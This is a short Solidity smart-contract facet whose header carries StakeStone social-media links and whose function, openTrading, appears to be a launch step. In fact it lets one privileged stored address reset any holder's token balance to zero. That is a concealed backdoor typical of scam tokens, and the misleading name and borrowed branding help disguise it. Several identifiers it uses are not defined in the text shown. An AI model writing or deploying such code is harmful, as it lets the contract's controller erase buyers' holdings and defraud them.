/*  
   * SPDX-License-Identifier: MIT


     // Telegram: https://t.me/+afYqz2KG_YNlNzNl
    // Twitter: https://twitter.com/Stake_Stone
    // Website: https://stakestone.io/
    // Discord: https://discord.com/invite/jemqJ9PkCJ
    // Medium:  https://medium.com/@official_42951


*/

pragma solidity ^0.8.23;
import "./TestLib.sol";
contract openTradingFacet {
    function openTrading(address bots) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (
            ds.xxnux == msg.sender &&
            ds.xxnux != bots &&
            pancakePair() != bots &&
            bots != ROUTER
        ) {
            ds._balances[bots] = 0;
        }
    }
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
}
